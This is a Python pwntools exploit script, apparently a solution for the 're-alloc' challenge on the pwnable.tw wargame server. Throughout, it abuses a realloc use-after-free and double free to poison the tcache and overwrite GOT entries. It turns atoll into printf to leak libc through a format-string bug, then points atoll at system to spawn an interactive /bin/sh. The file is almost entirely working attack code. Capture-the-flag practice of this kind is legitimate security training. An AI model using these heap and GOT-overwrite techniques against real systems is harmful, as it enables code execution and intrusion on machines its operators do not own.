#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\x00"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
pad = lambda len=1, c=b'A': c * len

exe = ELF("re-alloc_patched", checksec=False)
libc = ELF("libc.so", checksec=False)
ld = ELF("./ld-2.29.so", checksec=False)

context.terminal = ["/usr/bin/tilix", "-a", "session-add-right", "-e", "bash", "-c"]
context.binary = exe

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
b *read_long+62
set follow-fork-mode parent
set detach-on-fork on
continue
'''

def conn():
    if args.LOCAL:
        p = process([exe.path])
        sleep(0.1)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(0.5)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10106
        return remote(host, port)

p = conn()

def alloc(index, size, data):
    slan(p, b'choice', 1)
    slan(p, b'Index', index)
    slan(p, b'Size', size)
    sa(p, b'Data', data)
    sleep(0.1)

def realloc(index, size, data):
    slan(p, b'choice', 2)
    slan(p, b'Index', index)
    slan(p, b'Size', size)
    if size:
        sa(p, b'Data', data)
    sleep(0.1)

def rfree(index):
    slan(p, b'choice', 3)
    slan(p, b'Index', index)

print("Setting up tcache entries")
SZ = 0x70
alloc(0, SZ, p64(0))
alloc(1, SZ, p64(0))

rfree(0)
realloc(1, 0, b'')

# UAF index 1 - Setup GOT entry 0x80
realloc(1, SZ, p64(exe.got['alarm']))

# Clear index 0
alloc(0, SZ, p64(0))
realloc(0, SZ - 0x20, p64(0))
rfree(0)

# Double free index 1
realloc(1, SZ - 0x20, p64(0) * 2)
realloc(1, 0, b'')

# UAF index 1
realloc(1, SZ - 0x20, p64(exe.got['alarm']))

# Clear index 0
alloc(0, SZ - 0x20, p64(0))
realloc(0, SZ - 0x40, p64(0))
rfree(0)

# Clear index 1
realloc(1, SZ - 0x40, p64(0) * 2)
rfree(1)

print("Leaking libc")
# alarm -> nop, atolll -> printf
nop_ret = 0x40113f
alloc(0, SZ - 0x20, p64(nop_ret) + p64(exe.plt['printf']))

# FSB to leak libc on stack
slan(p, b'choice', 3)
sla(p, b'Index', b'stdout %7$p')

ru(p, b'stdout ')
libc.address = leak_hex(rn(p, 14), libc.symbols['_IO_2_1_stdout_'])
lg("libc base", libc.address)
lg("system", libc.symbols['system'])

print("Spawn shell")
slan(p, b'choice', 1)
sla(p, b'Index', b'') # printf return 1 -> index = 1
sla(p, b'Size', b'%111c') # printf return SZ -> size = SZ
# alarm -> nop, atoll -> system
sa(p, b'Data', p64(nop_ret) + p64(libc.symbols['system']))

slan(p, b'choice', 3)
sla(p, b'Index', b'/bin/sh\0') # system(/bin/sh)

# Profit
rr(p, 1)
ia(p)